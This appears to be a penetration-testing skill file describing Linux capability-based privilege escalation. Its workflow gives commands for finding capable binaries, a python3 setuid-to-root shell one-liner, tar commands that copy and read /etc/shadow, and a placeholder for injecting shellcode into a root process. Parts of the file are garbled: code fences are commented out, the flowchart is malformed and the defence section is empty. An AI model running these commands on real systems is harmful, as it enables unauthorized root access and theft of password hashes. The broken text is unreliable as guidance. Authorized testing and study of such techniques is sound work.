---
name: linux-capabilities-privesc
description: >
  Identify and exploit misconfigured Linux Capabilities. This skill covers how attackers escalate 
  privileges to root without relying on SUID binaries or kernel exploits by abusing excessive 
  capabilities like cap_dac_read_search, cap_sys_ptrace, or cap_setuid assigned to ordinary files.
domain: cybersecurity
subdomain: penetration-testing
category: Privilege Escalation
difficulty: advanced
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0004]
  techniques: [T1548.001]
platforms: [linux]
tags: [linux, capabilities, privilege-escalation, local-privesc, cap_setuid, tar]
tools: [getcap, python3, gcc]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Linux Capabilities Privilege Escalation

## When to Use
- During the post-exploitation phase on a Linux system after acquiring a low-privileged shell.
- When standard privilege escalation vectors (sudoers, SUID binaries, cron jobs) yield no results.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Enumerating File Capabilities

```bash
# getcap -r / 2>/dev/null

# ```

### Phase 2: Exploiting cap_setuid (e.g., Python, Perl, Tar)

```bash
# # python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# ```

### Phase 3: Exploiting cap_dac_read_search (e.g., Tar)

```bash
# # tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

### Phase 4: Exploiting cap_sys_ptrace (Process Injection)

```bash
# inject_shellcode $(pidof root_process)
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Run getcap ] --> B{Capabilities Found ]}
    B -->|Yes| C[Match Capability ]
    B -->|No| D[Check Other Vectors ]
    C --> E[Execute PrivEsc ]
```

## 🔵 Blue Team Detection & Defense
- **Audit File Capabilities Regularly**: **Principle of Least Privilege**: **Remove Development Tools**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Linux Capabilities Privesc — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- HackTricks: [Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
- GTFOBins: [GTFOBins Capabilities](https://gtfobins.github.io/#+capabilities)
